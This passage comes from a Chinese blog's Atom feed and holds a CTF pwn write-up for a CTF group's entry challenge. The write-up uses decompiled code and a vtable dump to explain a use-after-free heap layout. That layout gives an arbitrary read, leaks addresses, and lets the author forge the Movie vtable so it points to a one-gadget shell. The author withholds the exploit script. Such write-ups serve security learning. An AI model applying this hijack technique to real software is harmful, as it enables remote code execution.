)</span><br><span class="line">    &#123;</span><br><span class="line">      (**(<span class="keyword">void</span> (***)(<span class="keyword">void</span>))*v1)();</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v1 != &amp;<span class="built_in">printf</span> );</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result )</span><br><span class="line">    result = <span class="built_in">puts</span>(<span class="string">"No Movie/TV exists!"</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h2><p>先创建3个名字一样的tv，然后都删掉，再创建一个movie，其中movie的actor会在堆中申请一片内存写入，我们可以通过actor，伪造一个movie，可以控制actor的指针，然后show的时候就可以任意地址读了。下面是movie打印信息的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_4011B0</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(</span><br><span class="line">           <span class="string">"Movie &lt;%s&gt;: %s rating: %.2f actors: %s\n"</span>,</span><br><span class="line">           a1 + <span class="number">8</span>,</span><br><span class="line">           a1 + <span class="number">72</span>,</span><br><span class="line">           *(_QWORD *)(a1 + <span class="number">208</span>),  <span class="comment">//这里可以用来任意地址读</span></span><br><span class="line">           *(<span class="keyword">float</span> *)(a1 + <span class="number">200</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>通过这个方法可以泄露出malloc地址，以及list_table地址。（可以计算magic gadget）</p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>伪造movie的虚表vtable，使其指向我们可控的内存（泄露了heap地址，将magic gadget地址写入heap中就行了）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.rodata:00000000004015A0 ; `vtable for&apos;Movie</span><br><span class="line">.rodata:00000000004015A0 _ZTV5Movie      dq 0                    ; offset to this</span><br><span class="line">.rodata:00000000004015A8                 dq offset _ZTI5Movie    ; `typeinfo for&apos;Movie</span><br><span class="line">.rodata:00000000004015B0 printf_movie    dq offset sub_4011B0    ; DATA XREF: add_movie+24↑o  //改成magic地址</span><br><span class="line">.rodata:00000000004015B8                 dq offset nullsub_2</span><br><span class="line">.rodata:00000000004015C0                 dq offset j___ZdlPv     ; operator delete(void *)</span><br><span class="line">.rodata:00000000004015C8                 align 20h</span><br><span class="line">.rodata:00000000004015E0 ; `vtable for&apos;TV</span><br><span class="line">.rodata:00000000004015E0 _ZTV2TV         dq 0                    ; offset to this</span><br><span class="line">.rodata:00000000004015E8                 dq offset _ZTI2TV       ; `typeinfo for&apos;TV</span><br><span class="line">.rodata:00000000004015F0 printf_tv       dq offset sub_4011E0    ; DATA XREF: add_tv+24↑o</span><br><span class="line">.rodata:00000000004015F8                 dq offset nullsub_1</span><br><span class="line">.rodata:0000000000401600                 dq offset j___ZdlPv_0   ; operator delete(void *)</span><br></pre></td></tr></table></figure></p><p>show的时候，list_table的开头存放这vtable的地址，vtable的开头是打印函数，如果伪造vtable的指向magic，就可以直接getshell了。</p><p>本题没有提供libc，需要通过泄露地址的后3位来查找。<br><a href="https://libc.blukat.me/" target="_blank" rel="noopener">https://libc.blukat.me/</a></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>暂时不放</p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>菜鸟乱写一通，看不懂不要喷，欢迎纠正。完成，撒花~~~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;blog已经搭了一段时间了，拖延症发作，一直没写。最近没做什么有意思的题，就写一下某CTF群的入群题解题思路。&lt;/p&gt;
&lt;h2 id=&quot;程序伪代码&quot;&gt;&lt;a href=&quot;#程序伪代码&quot; class=&quot;headerlink&quot; title=&quot;程序伪代码&quot;&gt;&lt;/a&gt;程序伪代码&lt;/h
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
